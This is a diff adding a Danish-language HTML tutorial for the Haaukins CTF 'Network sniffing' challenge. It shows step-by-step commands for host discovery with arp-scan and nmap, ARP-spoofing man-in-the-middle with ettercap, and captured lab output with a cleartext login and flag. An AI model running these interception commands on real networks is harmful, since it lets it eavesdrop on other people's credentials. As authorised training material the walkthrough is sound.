@@ -1,0 +1,48 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: Network sniffing — tutorial (ARP-spoofing MITM)</title>
+<meta name="description" content="Trin-for-trin guide til Haaukins Network sniffing: bliv man-in-the-middle med ARP-spoofing og læs et klartekst-HTTP-login ud af trafikken.">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>Network sniffing</h1>
+<p class="subtitle">Aflyt et klartekst-HTTP-login ved at gøre dig selv til mellemmand.</p>
+<div class="badges"><span class="badge cat">Forensics</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+<div class="callout">📚 <strong>Baggrund:</strong> denne opgave bygger på en fælles teknik — læs primeren: <a href="arp-mitm.html">Primer: ARP-spoofing &amp; MITM</a>.</div>
+<h2>Hvad går opgaven ud på?</h2>
+<p>To maskiner taler sammen i <strong>klartekst</strong> (et HTTP-login), og opgaven hinter:
+             <em>"all network traffic is passing through your Kali machine"</em>. Du skal aflytte trafikken
+             og finde flaget — hvilket kræver at du selv bliver mellemmanden (se primeren ovenfor).</p>
+<h2>Trin for trin</h2>
+<ol class="steps">
+             <li>Find din placering og de andre hosts: <code>ip -br a</code> og
+             <code>sudo arp-scan -I eth0 --localnet</code>.</li>
+             <li>Find hvem der er server: <code>sudo nmap -Pn -sT -p80,21,23 &lt;hosts&gt;</code> — kun login-serveren
+             har <code>80/http</code> åben.</li>
+             <li>Bliv MITM og lad ettercap dumpe klartekst-logins:
+             <pre><code>sudo sysctl -w net.ipv4.ip_forward=1
+sudo ettercap -T -q -i eth0 -M arp:remote /&lt;server-ip&gt;// ///</code></pre></li>
+             <li>Vent på det periodiske login — ettercap printer brugernavn, password og hele POST-body'en.</li>
+             </ol>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<p>Ettercap fanger login'et i klartekst; flaget ligger direkte i POST-body'en (URL-encoded,
+        så <code>%7B</code>={ og <code>%7D</code>=}):</p>
+        <pre><code>HTTP: ... USER: carsten@...  PASS: mormor1932
+CONTENT: email=...&amp;fl4g=HKN%7BE3-9Jj-ROzaz%7D&amp;password=...</code></pre>
+        <p>Flag (eksempel): <span class="flag">HKN{E3-9Jj-ROzaz}</span></p>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li>HTTP uden TLS sender alt i klartekst — en MITM læser hele POST-requesten.</li><li><code>ettercap -T</code> af-maskerer selv klartekst-logins; flaget lå i et skjult formfelt (<code>fl4g</code>).</li><li>URL-encodede værdier skal afkodes (<code>%7B</code>/<code>%7D</code>).</li></ul>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. Materialet er løsningsstøtte til en autoriseret
+trænings-/CTF-kontekst — brug det til at lære, ikke til at springe læringen over.
+</footer>
+</div>
+</body>
+</html>
